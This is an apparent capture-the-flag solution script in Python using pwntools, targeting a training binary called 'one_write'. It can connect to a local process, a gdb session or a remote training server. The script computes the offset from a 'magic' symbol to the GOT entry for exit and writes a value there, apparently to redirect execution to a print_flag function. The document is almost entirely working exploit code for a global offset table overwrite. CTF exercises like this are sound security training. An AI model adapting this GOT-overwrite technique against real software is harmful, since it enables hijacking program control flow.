from pwn import *

CHALL_PATH = "./one_write"
CHALL = ELF(CHALL_PATH)

context.arch="amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./one_write")
        gdb.attach(c, """
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./one_write")

magic = CHALL.symbols['magic']
tgt_address = CHALL.got['exit']
off = tgt_address - magic
print_flag_addr = CHALL.symbols['print_flag']

c.recvuntil(b'Choice: ')
c.sendline(b'2')
c.recvuntil(b'Offset: ')
c.sendline(bytes(str(off), 'utf-8'))
c.recvuntil(b'Value: ')
c.sendline(b'809')
c.recvuntil('you.\n')
print(c.recvline())
c.interactive()





